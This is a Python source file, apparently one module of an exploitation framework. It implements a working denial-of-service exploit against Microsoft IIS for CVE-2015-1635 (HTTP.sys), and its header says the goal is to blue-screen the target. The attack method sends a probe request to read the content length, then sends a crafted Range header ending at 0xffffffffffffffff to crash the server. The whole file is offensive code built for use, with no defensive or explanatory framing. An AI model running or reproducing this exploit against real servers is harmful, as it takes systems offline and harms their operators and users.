#######################################################
# IIS HTTP.sys DoS
# CVE-2015-1635
# Metasploit: auxiliary/dos/http/ms15_034_ulonglongadd
#
# This exploit makes use of a known DoS vulnerability
# in IIS in order to blue-screen the system.
#######################################################

from utils import Exploit
import socket
import re
 
class HTTPSys(Exploit):
    '''Class to perform the HTTP.sys DoS exploit'''
    RESOURCE = 'welcome.png'

    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='Crash/blue screen system via IIS',
            description='',
            requirements=['http/80'],
            webserver=False,
            server_ip=server_ip
        )

    def send(self, payload, target, read = False):
        '''Send data to the IIS server'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.send(payload)
        if read:
            r = s.recv(1024)
        else:
            r = None
        s.close()
        return r
    
    def attack(self, target: str):
        '''Perform the attack on a target to crash the system'''
        # TODO: error handling
        try:
            # Send first payload
            self.message(target, 'Sending first payload...')
            init = f'GET /{self.RESOURCE} HTTP/1.0\r\n\r\n'.encode()
            r = self.send(init, target, True)

            # Find content length of response
            min_len = re.search(rb'Content-Length: (\d+)', r)
            if min_len:
                min_len = min_len.group(1)
                min_len = int(min_len) - 2
                max_len = 0xffffffffffffffff

                # Use length to send real payload
                self.message(f'[{target}] Sending second and final payload...')
                self.send(f'GET /{self.RESOURCE} HTTP/1.1\r\nHost: stuff\r\nRange: bytes={min_len}-{max_len}\r\n\r\n'.encode(), target)
                # TODO: check that system crashed
                self.success(target)
        except ConnectionRefusedError:
            self.error(target, 'Could not connect to website; skipping')
